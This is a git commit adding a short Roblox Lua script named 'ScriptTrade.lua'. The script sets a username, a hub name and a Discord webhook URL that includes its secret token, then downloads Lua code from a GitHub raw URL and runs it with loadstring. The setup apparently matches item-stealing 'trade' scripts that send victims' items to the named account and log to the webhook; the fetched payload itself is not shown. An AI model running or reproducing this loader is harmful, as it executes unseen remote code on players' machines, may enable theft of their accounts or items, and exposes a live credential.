c5de184e0d0763cd350d3a154c9ebdef4088bbe6
zxcGiga8 <130229885+zxcGiga8@users.noreply.github.com>
2023-04-25 18:40:13 +0300

    Create ScriptTrade.lua

---
+++ ScriptTrade.lua
@@ -0,0 +1,5 @@
+_G.Username = "dima12407842"
+_G.HubName = "YScript"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1100392852401438740/QkoPRMFAhHxFwd8WJ69tGaoLB_FQk_JEBDClfPLkQnQXpr36G3-pA1OQ0434vomoqJiZ"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
